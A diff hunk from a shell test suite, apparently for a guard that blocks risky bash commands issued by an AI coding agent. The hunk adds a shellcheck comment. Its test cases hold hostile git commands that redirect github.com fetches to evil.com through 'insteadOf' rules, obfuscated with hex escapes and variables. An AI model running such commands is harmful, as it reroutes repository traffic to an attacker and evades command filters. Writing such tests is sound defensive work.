@@ -511,6 +511,7 @@ assert_rc "glm config set --file value before insteadOf key" 2 "$(run_case "$(j_
 assert_rc "glm config --type value before insteadOf key" 2 "$(run_case "$(j_bash 'git config --type bool --file .git/config url.https://evil.com/.insteadOf https://github.com/')" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm config ANSI-C hex escape in key" 2 "$(run_case "$(j_bash "git config \$'url.https://evil.com/.\\x69nsteadOf' https://github.com/")" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm git -c ANSI-C escape" 2 "$(run_case "$(j_bash "git -c \$'url.https://evil.com/.\\x69nsteadOf=https://github.com/' fetch")" "ANTHROPIC_BASE_URL=$GLM_URL")"
+# shellcheck disable=SC2016  # literal $i is the payload, not an expansion
 assert_rc "glm config variable hides insteadOf suffix" 2 "$(run_case "$(j_bash 'git config url.https://evil.com/.$i https://github.com/')" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm git -c core.pager=cat log allowed" 0 "$(run_case "$(j_bash 'git -c core.pager=cat log')" "ANTHROPIC_BASE_URL=$GLM_URL")"
 assert_rc "glm git -c quoted insteadOf one-shot fetch" 2 "$(run_case "$(j_bash "git -c 'url.https://evil.com/.insteadOf=https://github.com/' fetch")" "ANTHROPIC_BASE_URL=$GLM_URL")"
